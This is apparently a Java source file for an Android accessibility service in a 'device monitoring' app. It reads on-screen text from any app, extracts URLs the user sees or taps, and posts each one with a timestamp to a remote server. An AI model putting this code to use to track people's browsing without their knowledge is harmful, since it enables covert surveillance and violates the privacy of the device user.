package com.example.devicemonitoring;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AccessibilityService";
    private static final long URL_SEND_INTERVAL = Constants.TIMEOUT_DURATION;

    private String searchUrl=Constants.SERVER_URL;
    private String lastSentUrl = null; // Lưu URL cuối cùng đã gửi
    private long lastSentTime = 0;


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d(TAG, "Event received: " + event.toString());

        // Xử lý sự kiện nhấn (click) và thay đổi nội dung cửa sổ
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED ||
              event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            handleContentChange(event);
        }
    }

    private void handleContentChange(AccessibilityEvent event) {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null) {
            String url = extractUrlFromNodeInfo(nodeInfo);
            nodeInfo.recycle();

            if (url != null) {
                Log.d(TAG, "Detected URL: " + url);
                sendSearchToServer(url);
            } else {
                Log.d(TAG, "No URL found in the event.");
            }
        } else {
            Log.d(TAG, "NodeInfo is null.");
        }
    }

    private String extractUrlFromNodeInfo(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) return null;

        // Kiểm tra text của nút hiện tại
        if (nodeInfo.getText() != null) {
            String text = nodeInfo.getText().toString();
            String url = extractUrlFromText(text);
            if (url != null) return url;
        }

        // Kiểm tra content description của nút hiện tại
        if (nodeInfo.getContentDescription() != null) {
            String contentDescription = nodeInfo.getContentDescription().toString();
            String url = extractUrlFromText(contentDescription);
            if (url != null) return url;
        }

        // Kiểm tra các nút con
        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            AccessibilityNodeInfo childNode = nodeInfo.getChild(i);
            if (childNode != null) {
                String url = extractUrlFromNodeInfo(childNode);
                childNode.recycle();
                if (url != null) return url;
            }
        }

        return null;
    }

    private String extractUrlFromText(String text) {
        if (text == null || text.isEmpty()) return null;

        // Sử dụng regex để tìm URL trong chuỗi văn bản
        String regex = "(https?://[^\\s]+)";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(text);

        if (matcher.find()) {
            return matcher.group(1); // Trả về URL đầu tiên được tìm thấy
        }

        return null;
    }

    private void handleClickEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null) {
            String url = extractUrlFromNodeInfo(nodeInfo);
            nodeInfo.recycle();

            if (url != null) {
                Log.d(TAG, "Detected URL: " + url);
                sendSearchToServer(url);
            }
        }
    }



    private String normalizeUrl(String url) {
        if (url == null) return null;

        url = url.replace("›", "").replace("...", "").trim();
        if (!url.startsWith("http")) {
            url = "https://" + url;
        }

        return url;
    }

    private void sendSearchToServer(String searchText) {
        long currentTime = System.currentTimeMillis();

        if (currentTime - lastSentTime < URL_SEND_INTERVAL) {
            Log.d(TAG, "Skipped sending due to timing: " + searchText);
            return;
        }

        if (searchText.equals(lastSentUrl)) {
            Log.d(TAG, "Duplicate URL detected, skipping: " + searchText);
            return;
        }

        if (!isValidUrl(searchText)) {
            Log.d(TAG, "Filtered invalid URL: " + searchText);
            return;
        }

        lastSentUrl = searchText;
        lastSentTime = currentTime;

        String url = searchUrl+"/submit-search";

        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = new FormBody.Builder()
                .add("link", searchText)
                .add("timestamp", String.valueOf(currentTime))
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Error sending search data to server", e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Search data sent successfully");
                } else {
                    Log.e(TAG, "Failed to send search data: " + response.message());
                }
            }
        });
    }

    private boolean isValidUrl(String url) {
        return url != null && url.startsWith("http") && !url.contains("cl.php") && !url.contains("bannerid");
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
}